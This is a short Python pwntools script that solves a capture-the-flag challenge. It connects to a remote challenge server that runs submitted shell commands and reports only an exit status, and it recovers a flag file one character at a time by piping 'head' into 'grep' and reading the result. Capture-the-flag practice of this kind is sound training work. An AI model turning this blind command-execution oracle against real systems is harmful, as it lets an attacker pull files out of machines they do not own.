#!/usr/bin/env python2

from __future__ import print_function

import string
import sys

from pwn import *

ALPHABET = (
    string.printable
          .replace('"', '\\"')
          .replace("'", "\\'")
          .replace(';', '\\;')
          .replace('&', '\\&')
          .replace('|', '\\|')
          .replace('$', '\\$')
          .replace('\\', '')
          .replace('*', '')
          .replace('\n', '')
          .replace('\t', '')
          .replace('.', '')
)


def main():
    io = remote('challenges.tamuctf.com', 3424)

    flag = 'gigem{'
    while not flag.endswith('}'):
        for c in ALPHABET:
            io.recvuntil('Execute: ')
            cmd = "head -c%i flag.txt | grep '%s'" % (len(flag) + 1, flag + c)
            io.sendline(cmd)
            if io.recvline().strip() == '0':
                flag += c
                print(flag)
                break
        else:
            print('FAILED')
            sys.exit()


if __name__ == '__main__':
    main()
